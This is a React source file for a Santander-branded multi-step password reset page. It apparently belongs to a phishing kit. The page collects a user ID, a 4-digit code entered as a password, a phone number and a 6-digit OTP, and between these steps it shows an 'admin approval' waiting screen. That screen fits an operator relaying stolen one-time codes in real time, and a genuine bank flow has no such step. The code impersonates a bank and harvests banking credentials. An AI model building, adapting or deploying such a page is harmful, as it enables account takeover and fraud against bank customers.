import React, { useState, FormEvent, ChangeEvent } from 'react';
import { useNavigate } from 'react-router-dom';
import { API_BASE_URL } from '../config';
import { 
  Alert, 
  Button, 
  TextField, 
  Box, 
  Typography, 
  Paper,
  CircularProgress
} from '@mui/material';

type ResetStep = 'user_verification' | 'phone_entry' | 'otp_verification' | 'admin_approval' | 'complete';

export const PasswordResetPage: React.FC = () => {
  const [step, setStep] = useState<ResetStep>('user_verification');
  const [userId, setUserId] = useState('');
  const [code, setCode] = useState('');
  const [phone, setPhone] = useState('');
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [resetRequestId, setResetRequestId] = useState('');
  const navigate = useNavigate();

  const handleUserVerification = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      // In a real app, verify user ID and code with the backend
      const response = await fetch(`${API_BASE_URL}/api/verify-user`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, code })
      });
      
      const data = await response.json();
      
      if (response.ok) {
        setResetRequestId(data.requestId);
        setStep('phone_entry');
      } else {
        setError(data.error || 'Verification failed');
      }
    } catch (err) {
      setError('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handlePhoneSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/request-reset-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          requestId: resetRequestId,
          phoneNumber: phone 
        })
      });
      
      const data = await response.json();
      
      if (response.ok) {
        setStep('admin_approval');
        // In a real app, you would set up WebSocket or polling to check approval status
      } else {
        setError(data.error || 'Failed to request OTP');
      }
    } catch (err) {
      setError('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleOtpSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/verify-reset-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          requestId: resetRequestId,
          otp 
        })
      });
      
      const data = await response.json();
      
      if (response.ok) {
        setStep('complete');
        // In a real app, you would redirect to a success page or login
      } else {
        setError(data.error || 'Invalid OTP');
      }
    } catch (err) {
      setError('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const renderStep = () => {
    switch (step) {
      case 'user_verification':
        return (
          <form onSubmit={handleUserVerification}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: 'bold' }}>
              Reset Your Password
            </Typography>
            <Typography variant="body2" color="textSecondary" sx={{ mb: 3 }}>
              Please enter your User ID and the 4-digit code provided to you.
            </Typography>
            <TextField
              label="User ID"
              fullWidth
              margin="normal"
              value={userId}
              onChange={(e: ChangeEvent<HTMLInputElement>) => setUserId(e.target.value)}
              required
            />
            <TextField
              label="4-Digit Code"
              fullWidth
              margin="normal"
              type="password"
              inputProps={{ maxLength: 4, pattern: '\\d{4}' }}
              value={code}
              onChange={(e: ChangeEvent<HTMLInputElement>) => setCode(e.target.value.replace(/[^0-9]/g, ''))}
              required
            />
            <Button 
              type="submit" 
              variant="contained" 
              fullWidth 
              disabled={loading}
              sx={{ 
                mt: 2, 
                py: 1.5,
                bgcolor: '#EC0000',
                '&:hover': { bgcolor: '#B80000' }
              }}
            >
              {loading ? <CircularProgress size={24} color="inherit" /> : 'Continue'}
            </Button>
          </form>
        );
        
      case 'phone_entry':
        return (
          <form onSubmit={handlePhoneSubmit}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: 'bold' }}>Enter Your Phone Number</Typography>
            <Typography variant="body2" color="textSecondary" gutterBottom sx={{ mb: 2 }}>
              We'll send a verification code to this number for security.
            </Typography>
            <TextField
              label="Phone Number"
              fullWidth
              margin="normal"
              type="tel"
              value={phone}
              onChange={(e: ChangeEvent<HTMLInputElement>) => setPhone(e.target.value)}
              placeholder="+1 (123) 456-7890"
              required
            />
            <Button 
              type="submit" 
              variant="contained" 
              fullWidth 
              disabled={loading}
              sx={{ 
                mt: 2, 
                py: 1.5,
                bgcolor: '#EC0000',
                '&:hover': { bgcolor: '#B80000' }
              }}
            >
              {loading ? <CircularProgress size={24} color="inherit" /> : 'Send Verification Code'}
            </Button>
          </form>
        );
        
      case 'admin_approval':
        return (
          <Box textAlign="center">
            <Typography variant="h5" gutterBottom sx={{ fontWeight: 'bold' }}>Loading</Typography>
            <Typography variant="body1" paragraph>
              Your password reset request has been sent
            </Typography>
            <Typography variant="body2" color="textSecondary" paragraph>
              Please wait while we process your request. This may take a few moments.
            </Typography>
            <CircularProgress sx={{ my: 3, color: '#EC0000' }} />
            <Typography variant="caption" display="block" color="textSecondary">
              This is taking more than Usual. We will notify you once approved.
            </Typography>
            {/* In a real app, this would be handled via WebSockets */}
            <Button 
              variant="outlined" 
              onClick={() => setStep('otp_verification')}
              sx={{ 
                mt: 2,
                color: '#EC0000',
                borderColor: '#EC0000',
                '&:hover': {
                  borderColor: '#B80000',
                  backgroundColor: 'rgba(236, 0, 0, 0.04)'
                }
              }}
            >
              (Dev) Skip to OTP
            </Button>
          </Box>
        );
        
      case 'otp_verification':
        return (
          <form onSubmit={handleOtpSubmit}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: 'bold' }}>Enter Verification Code</Typography>
            <Typography variant="body2" color="textSecondary" gutterBottom sx={{ mb: 2 }}>
              Please enter the 6-digit OTP sent to your phone number.
            </Typography>
            <TextField
              label="Verification Code"
              fullWidth
              margin="normal"
              type="text"
              inputProps={{ maxLength: 6 }}
              value={otp}
              onChange={(e: ChangeEvent<HTMLInputElement>) => setOtp(e.target.value.replace(/[^0-9]/g, ''))}
              required
            />
            <Button 
              type="submit" 
              variant="contained" 
              fullWidth 
              disabled={loading}
              sx={{ 
                mt: 2, 
                py: 1.5,
                bgcolor: '#EC0000',
                '&:hover': { bgcolor: '#B80000' }
              }}
            >
              {loading ? <CircularProgress size={24} color="inherit" /> : 'Verify Code'}
            </Button>
          </form>
        );
        
      case 'complete':
        return (
          <Box textAlign="center">
            <Typography variant="h5" gutterBottom sx={{ fontWeight: 'bold' }}>Password Reset Successful</Typography>
            <Typography variant="body1" paragraph>
              Your password has been successfully reset. You can now log in with your new credentials.
            </Typography>
            <Button 
              variant="contained" 
              onClick={() => navigate('/login')}
              sx={{ 
                mt: 2, 
                py: 1.5,
                bgcolor: '#EC0000',
                '&:hover': { bgcolor: '#B80000' }
              }}
            >
              Return to Login
            </Button>
          </Box>
        );
        
      default:
        return null;
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4">
      <div className="w-full max-w-md">
        <div className="flex justify-center mb-8">
          <img src="/santander-logo.svg" alt="Santander Logo" className="w-48" />
        </div>
        <Paper
          elevation={3}
          sx={{
            p: { xs: 3, sm: 4 },
            width: '100%',
            borderRadius: '8px'
          }}
        >
          {error && <Alert severity="error" sx={{ mb: 3 }}>{error}</Alert>}
          {renderStep()}
        </Paper>
      </div>
    </div>
  );
};

export default PasswordResetPage;
